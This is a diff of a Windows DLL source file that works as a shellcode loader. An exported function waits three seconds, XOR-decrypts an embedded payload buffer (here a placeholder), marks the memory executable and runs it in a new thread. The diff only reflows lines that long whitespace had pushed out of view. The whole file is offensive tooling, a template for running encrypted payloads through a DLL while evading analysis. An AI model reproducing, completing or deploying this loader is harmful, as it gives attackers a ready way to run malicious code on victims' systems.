@@ -1,9 +1,11 @@
 #include <windows.h>
-#include <stdio.h>                                                                                   #include <stdlib.h>
+#include <stdio.h>                                                                                  
+#include <stdlib.h>
 #include <string.h>
 
 
-void XOR(char * data, size_t data_len, char * key, size_t key_len) {                                         int j;
+void XOR(char * data, size_t data_len, char * key, size_t key_len) {                                         
+        int j;
         j = 0;
         for (int i = 0; i < data_len; i++) {
                 if (j == key_len - 1) j = 0;
@@ -19,7 +21,8 @@ BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpRese
     case DLL_PROCESS_ATTACH:
     case DLL_PROCESS_DETACH:
     case DLL_THREAD_ATTACH:
-    case DLL_THREAD_DETACH:                                                                                  break;
+    case DLL_THREAD_DETACH:                                                                                 
+                   break;
     }
     return TRUE;
 }
@@ -31,7 +34,8 @@ extern "C" {
                 HANDLE th;
                 DWORD oldprotect = 0;
 
-                unsigned char payload[] = "key:";                                                                    unsigned int pay_len = sizeof(payload);
+                unsigned char payload[] = "key:";                                                                    
+                unsigned int pay_len = sizeof(payload);
                 char key[] = "key:";
                 exec_mem = VirtualAlloc(0, pay_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                 Sleep(3000);
@@ -40,7 +44,8 @@ extern "C" {
                 rv = VirtualProtect(exec_mem, pay_len, PAGE_EXECUTE_READ, &oldprotect);
                 if ( rv != 0 ) {
                         th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
-                        WaitForSingleObject(th, -1);                                                                 }
+                        WaitForSingleObject(th, -1);                                                               
+                }
 
                 return TRUE;
         }
